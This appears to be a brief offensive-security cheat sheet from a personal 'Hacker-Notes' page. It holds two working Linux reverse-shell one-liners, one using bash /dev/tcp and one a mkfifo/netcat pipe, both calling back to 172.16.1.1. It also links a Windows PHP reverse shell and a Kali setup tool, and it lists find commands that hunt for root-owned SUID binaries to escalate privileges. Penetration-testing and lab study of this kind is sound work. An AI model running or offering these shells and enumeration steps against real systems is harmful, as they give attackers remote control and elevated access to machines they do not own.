# Hacker-Notes

PimpMyKali - https://github.com/Dewalt-arch/pimpmykali

Payloads - 

#!/bin/bash
bash -i >& /dev/tcp/172.16.1.1/443 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.1.1 4434 >/tmp/f

Windows reverse shell .php - https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php

SUIDS etc
find / -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;
